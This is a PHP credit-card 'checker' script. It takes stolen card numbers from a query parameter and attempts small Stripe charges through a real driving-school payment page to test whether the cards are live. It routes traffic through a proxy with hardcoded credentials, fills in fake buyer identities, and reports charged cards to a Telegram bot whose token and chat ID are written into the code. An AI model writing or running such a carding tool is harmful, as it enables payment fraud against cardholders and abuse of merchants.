<?php
error_reporting(0);
$time_start = microtime(true);
set_time_limit(200);
//include("firstDataMessage.php");
function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


function RandomString($length = 16)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function cURLc($url, $headers, $postfields, $customrequest) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        // CURLOPT_SSL_VERIFYPEER => 1,
        // CURLOPT_SSL_VERIFYHOST => 1,
        // CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_HEADER => 1,
        CURLOPT_CUSTOMREQUEST => $customrequest,
//        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
//        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}
function cURL($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => $_fls,
        CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_HEADER => 1,
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}
$ips = file_get_contents("https://magic.bins.ngrok.io/io.php/");
function cURL_ProxyOn($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => $_fls,
        // CURLOPT_PROXY => "http://scraperapi.session_number=$port.ultra_premium=true.country_code=uk:f73965b26e9d8457634c8b1597c0e6da@proxy-server.scraperapi.com:8001/",
        CURLOPT_PROXY => "isp2.hydraproxy.com:9989",
        CURLOPT_PROXYUSERPWD => "grea31455bghb77263:aX7spy7kmrU5D53c",
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}
function randomInfo(){

    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://namegenerator.in/assets/refresh.php?location=united-states',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_PROXY => "isp2.hydraproxy.com:9989",
        CURLOPT_PROXYUSERPWD => "grea31455bghb77263:aX7spy7kmrU5D53c",
        CURLOPT_CUSTOMREQUEST => 'GET',
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return $response;
}
extract($_GET);
$separator = explode("|", $lista);
$cc = $separator[0];
$ccbin = substr($cc, 0,6);
$mm = $separator[1];
$yy = $separator[2];
$yy1 = substr($yy, 2,2);
$cvv = $separator[3];

$cbin = substr($cc, 0,1);
$rnum = rand(1111,9999);


if($cbin == 5){
    $cbin = 'masterCard';
}
else if($cbin == 4){
    $cbin = 'visa';
}

function solveCaptcha($site,$siteKey,$clientKey){
    $createTask =  cURLc(
        "https://api.capmonster.cloud/createTask",
        $headers = [
            "Content-Type: application/json",
            "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","task":{"type":"NoCaptchaTaskProxyless","websiteURL":"'.$site.'","websiteKey":"'.$siteKey.'"}}',
        "POST"
    );
    $taskId = getstr(json_encode($createTask,true),'"taskId\":','}');
    $status = "processing";
    $gResponse = "";
    while ($status == "processing") {
        sleep(3);
        $getTaskResult =  cURLc(
            "https://api.capmonster.cloud/getTaskResult ",
            $headers = [
                "Content-Type: application/json",
                "accept: application/json"
            ],
            '{"clientKey":"'.$clientKey.'","taskId": '.$taskId.'}',
            "POST"
        );
        $status = getstr($getTaskResult,'"status":"','"');
        $gResponse = getstr($getTaskResult,'"gRecaptchaResponse":"','"');}
    return $getTaskResult ;
}
$port = rand(10000, 11000);
$ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => "https://binov.net/",
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_HEADER => 1,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/x-www-form-urlencoded",
        "Referer: https://binov.net/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32"
    ],
    CURLOPT_POSTFIELDS => "BIN=$ccbin"
));
$g_ccdets = curl_exec($ch);
//$cc_bin = GetStr($g_ccdets, '</tr><tr><td>' , '</td>');
$cc_type0 = GetStr($g_ccdets, "$cc_bin</td><td>" , '</td>');
$cc_bname = GetStr($g_ccdets, "$cc_type0</td><td>" , '</td>');
$cc_type1 = GetStr($g_ccdets, "$cc_bname</td><td>" , '</td>');
$cc_type2 = GetStr($g_ccdets, "$cc_type1</td><td>" , '</td>');
$cc_country = GetStr($g_ccdets, "$cc_type2</td><td>" , '</td>');
// $CC_fDets = "BIN: $ccbin BIN Info: $type0-$type1-$type2 Bank: $cc_bname Country: $cc_country";
$CC_fDets = "Bank: $cc_bname Country: $cc_country";
$randomShits = randomInfo();
$data = json_decode($randomShits, true);
$fname = explode(" ", $data['name'])[0];
$lname = explode(" ", $data['name'])[1];
$email = $data['email']['address'];
$street = $data['street1'];
$local = GetStr($randomShits, '"street2":', ',"phone"');
$city = GetStr($local, '"', ',');
$state = GetStr($local, ', ', ' ');
$phone = str_replace("-", "", $data['phone']);
$postcode = GetStr($local, "$state" , '"');


$cookie = RandomString();
$str = substr(randomString(), 0,7);
$page =  cURL_ProxyOn(
    "https://www.mvdriversed.com/asp-products/drivers-ed-payment/",
    $headers = [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'user-agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39'
    ],
    "",
    "GET",
    1,
    $cookie
);  $buttonkey = GetStr($page, '"button_key":"', '"');
//  $create_pi = GetStr($page, '"asp_pp_ajax_create_pi_nonce":"', '"');

$get_id =  cURL_ProxyOn(
    "https://m.stripe.com/6",
    $headers = [
        'accept: */*',
        'content-type: text/plain;charset=UTF-8',
        'origin: https://m.stripe.network',
        'referer: https://m.stripe.network/',
        'user-agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39'
    ],
    "",
    "POST",
    1,
    $cookie
);
$muid =  GetStr($get_id, '"muid":"', '"');
$guid = GetStr($get_id, '"guid":"', '"');
$sid = GetStr($get_id, '"sid":"', '"');
if (empty($guid)) {
    $guid = "N/A";
}
if (empty($muid)) {
    $muid = "N/A";
}
if (empty($sid)) {
    $sid = "N/A";
}


$token_method =  cURL_ProxyOn(
    "https://api.stripe.com/v1/tokens",
    $headers = [
        "accept: application/json",
        "content-type: application/x-www-form-urlencoded",
        "origin: https://js.stripe.com",
        "referer: https://js.stripe.com/",
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39'
    ],
    "email=$str@gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2F78ef418)&referrer=https%3A%2F%2Fwww.mvdriversed.com%2Fasp-products%2Fdrivers-ed-payment%2F&time_checkout_opened=1655196722&time_checkout_loaded=1655196721&card[number]=$cc&card[cvc]=&card[exp_month]=".ltrim($mm,0)."&card[exp_year]=$yy&card[name]=$str@gmail.com&card[address_zip]=".rand(91000,94000)."&time_on_page=9633&guid=$guid&muid=$muid&sid=$sid&key=pk_live_7isxqASaOekhsYrAFhS0i7Rr",
    "POST",
    1,
    $cookie
); $token = 'tok_'.GetStr($token_method, '"id": "tok_', '"');
if (strpos($token_method, '"id": "tok_') && !strpos($token_method, '"error":')) {

    $ajax_confirm =  cURL_ProxyOn(
        "https://www.mvdriversed.com/asp-products/drivers-ed-payment/",
        $headers = [
            "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "content-type: application/x-www-form-urlencoded",
            "referer: https://www.mvdriversed.com/asp-products/drivers-ed-payment/",
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.39'
        ],
        "stripeAmount=1.00&stripeProductId=4969&stripeToken=$token&stripeTokenType=card&stripeEmail=$str@gmail.com&stripeButtonKey=$buttonkey&stripeItemPrice=0&stripeTax=0&stripeShipping=0&stripeItemCost=0&asp_action=process_ipn&item_name=Drivers+Ed+Credit+Card+Payment+%24427&item_quantity=1&currency_code=USD&item_url=&thankyou_page_url=&charge_description=&clickProcessed=1",
        "POST",
        1,
        $cookie
    );

    $response = GetStr($ajax_confirm, 'System was not able to complete the payment.','.');
}else{
    $response = GetStr($token_method, '"message": "','"');
}


if (strpos($ajax_confirm, 'Thank you for your payment.')){
    echo '<tr><td><span class="badge bg-success">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged['.$amnt.'.00]$</span> <span class="badge bg-light text-dark">'.$CC_fDets.'</span></td></tr><br>';
    file_get_contents('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text='.$lista.' CHARGED CCN - STRPE GATE');
}elseif(strpos($ajax_confirm, 'System was not able to complete the payment.') || $response == 'Your card was declined.') {
    echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill"> "MESSAGE": "'.urldecode($response).'" - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
}else {
    echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">Processing unsuccessful(May be Merchant is dead or network is blocked) - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
}

unlink("cookies/$cookie.txt");

?>